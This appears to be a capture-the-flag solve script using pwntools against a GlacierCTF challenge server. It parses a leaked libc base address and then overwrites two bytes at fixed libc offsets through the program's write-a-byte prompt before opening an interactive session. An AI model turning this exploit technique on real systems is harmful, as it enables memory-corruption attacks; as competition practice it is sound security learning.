#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = process([exe.path])
# gdb.attach(p, gdbscript="""
# b *exit
# c
# """)
p = remote("challs.glacierctf.com", 13377)

# exe_leak = int(p.recvuntil(b"-", drop=True).decode().split()[-1], 16)
# log.info(f"{hex(exe_leak)=}")

p.recvuntil(b"heap")
libc = int(p.recvuntil(b"-", drop=True).decode().split()[-1], 16)
log.info(f"{hex(libc)=}")

# p.recvuntil(b"stacks ")
# stack_leak = int(p.recvline().decode().split()[0], 16)
# log.info(f"{hex(stack_leak)=}")

# libc_base = p.recvline_contains(b'libc.so.6')

# libc = int(libc_base.decode().split('-')[0], 16)
success(f'{libc=:x}')

def setbyte(address: int, byte: int):
    p.sendlineafter(b'wish?', hex(address).encode())
    p.sendlineafter(b'here?', hex(byte).encode())

first_addr = libc + 0x47a22
second_addr = libc + 0x47a23

setbyte(first_addr, 0x05)
setbyte(second_addr, 0x7b)

p.interactive()
